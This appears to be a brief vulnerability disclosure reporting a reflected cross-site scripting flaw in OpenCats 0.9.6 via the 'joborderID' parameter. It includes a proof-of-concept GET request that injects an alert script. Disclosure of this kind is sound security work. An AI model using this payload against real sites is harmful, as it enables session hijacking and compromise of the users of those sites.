# Cross Site Scripting vulnerability in the OpenCats 'joborderID'.

OpenCats version 0.9.6 PHP7.2 suffers from reflected XSS vulnerability. 
This allows attackers arbitrary JavaScript injection, which compromises secure session between client and server.

### PoC

```
GET /ajax.php?f=getPipelineJobOrder&joborderID=1)"></a> <script>alert`xss`</script>&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0
```

![XSS3](https://user-images.githubusercontent.com/57464251/192360983-8b894daa-c070-4fe2-ac7d-28a29b22de97.png)
